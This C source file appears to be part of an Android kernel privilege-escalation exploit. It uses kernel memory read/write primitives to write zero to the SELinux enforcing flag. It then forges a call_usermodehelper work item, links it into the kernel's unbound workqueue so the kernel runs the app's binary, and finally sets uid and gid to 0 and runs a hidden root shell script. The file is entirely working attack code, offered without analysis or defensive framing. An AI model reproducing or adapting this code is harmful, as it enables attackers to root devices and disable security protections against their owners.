#include "common.h"
#include "runtime_struct_offsets.h"

#define UMH_BINARY_PATH "/data/user/0/com.myghostlock.fire/files/ghostlock"
#define UMH_WORK_OFF 0x2000
#define UMH_DATA_OFF 0x2080

struct umh_subprocess_info {
  uint8_t work[48];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  int32_t wait;
  int32_t retval;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  uint64_t argv[4];
  uint64_t envp[1];
};

static uint64_t umh_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  if (!pipe_phys_read_data(fd, target, &value, 8)) {
    kernel_read_data(fd, target, &value, 8);
  }
  return value;
}

static uint32_t umh_read32(int fd, uintptr_t target) {
  uint32_t value = 0;
  if (!pipe_phys_read_data(fd, target, &value, 4)) {
    kernel_read_data(fd, target, &value, 4);
  }
  return value;
}

static int umh_write32(int fd, uintptr_t target, uint32_t value) {
  if (pipe_phys_write_data(fd, target, &value, 4)) return 1;
  return kernel_write_data(fd, target, &value, 4) == 4;
}

static int umh_write64(int fd, uintptr_t target, uint64_t value) {
  if (pipe_phys_write_data(fd, target, &value, 8)) return 1;
  return kernel_write_data(fd, target, &value, 8) == 8;
}

int install_umh_root(int configfs_fd) {
  if (!SYSTEM_UNBOUND_WQ || !CALL_USERMODEHELPER_EXEC_WORK) return 0;
  int fd = configfs_fd;
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t permissive = 0;
  pipe_phys_write_data(fd, selinux_addr, &permissive, 1);

  uintptr_t wq = umh_read64(fd, data_addr(SYSTEM_UNBOUND_WQ));
  uintptr_t pwq = umh_read64(fd, wq + 0xb0); // WQ_DFL_PWQ_OFF
  uintptr_t pool = umh_read64(fd, pwq + 0x00); // PWQ_POOL_OFF
  uintptr_t worklist = pool + 0x28; // POOL_WORKLIST_OFF

  struct umh_kernel_data umh_data;
  memset(&umh_data, 0, sizeof(umh_data));
  snprintf(umh_data.path, sizeof(umh_data.path), "%s", UMH_BINARY_PATH);
  snprintf(umh_data.arg, sizeof(umh_data.arg), "--umh");
  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());

  uintptr_t umh_data_addr = page_base + UMH_DATA_OFF;
  umh_data.completion.next = umh_data_addr + 8;
  umh_data.completion.prev = umh_data_addr + 8;
  umh_data.argv[0] = umh_data_addr + offsetof(struct umh_kernel_data, path);
  umh_data.argv[1] = umh_data_addr + offsetof(struct umh_kernel_data, arg);
  umh_data.argv[2] = umh_data_addr + offsetof(struct umh_kernel_data, uid);

  struct umh_subprocess_info fake;
  memset(&fake, 0, sizeof(fake));
  uint64_t work_data = pwq | 5;
  memcpy(fake.work + 0, &work_data, 8);
  memcpy(fake.work + 8, &worklist, 8);
  memcpy(fake.work + 16, &worklist, 8);
  uint64_t exec_func = CALL_USERMODEHELPER_EXEC_WORK;
  memcpy(fake.work + 24, &exec_func, 8);
  fake.complete = umh_data_addr;
  fake.path = umh_data.argv[0];
  fake.argv = umh_data_addr + offsetof(struct umh_kernel_data, argv);

  pipe_phys_write_data(fd, umh_data_addr, &umh_data, sizeof(umh_data));
  pipe_phys_write_data(fd, page_base + UMH_WORK_OFF, &fake, sizeof(fake));

  uintptr_t fake_entry = page_base + UMH_WORK_OFF + 8;
  umh_write64(fd, worklist + 8, fake_entry);
  umh_write64(fd, worklist, fake_entry);

  for (int i = 0; i < 1000; i++) {
    if (umh_read32(fd, umh_data_addr)) return 1;
    usleep(1000);
  }
  return 0;
}

void handle_umh_mode(int argc, char **argv) {
  if (argc < 2 || strcmp(argv[1], "--umh") != 0) return;
  setsid(); setgid(0); setuid(0);
  execl("/system/bin/sh", "sh", "/data/user/0/com.myghostlock.fire/files/.ghostlock_root.sh", NULL);
  _exit(0);
}
